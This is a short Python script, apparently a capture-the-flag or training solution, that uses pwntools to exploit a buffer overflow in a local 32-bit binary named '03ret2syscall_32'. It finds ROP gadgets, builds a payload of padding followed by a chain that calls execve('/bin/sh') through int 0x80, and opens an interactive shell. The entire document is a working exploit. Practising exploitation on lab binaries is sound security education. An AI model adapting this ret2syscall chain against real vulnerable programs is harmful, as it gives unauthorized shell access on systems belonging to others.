from pwn import *

s = process('03ret2syscall_32')
elf = ELF('03ret2syscall_32')
pop_edx_ecx_ebx = ROP(elf).find_gadget(['pop edx', 'pop ecx', 'pop ebx'])[0]
pop_eax_ret = ROP(elf).find_gadget(['pop eax', 'ret'])[0]
int_0x80 = ROP(elf).find_gadget(['int 0x80'])[0]

binsh = elf.search(b'/bin/sh').__next__()
print(hex(int_0x80))

# execve("/bin/sh",NULL,NULL), ebx=/bin/sh, ecx=0, edx=0, 使用 int 0x80 调用syscall
payload = flat('A' * (0x208 + 4), pop_eax_ret, 0xb, pop_edx_ecx_ebx, 0, 0, binsh, int_0x80)
s.sendline(payload)
s.interactive()
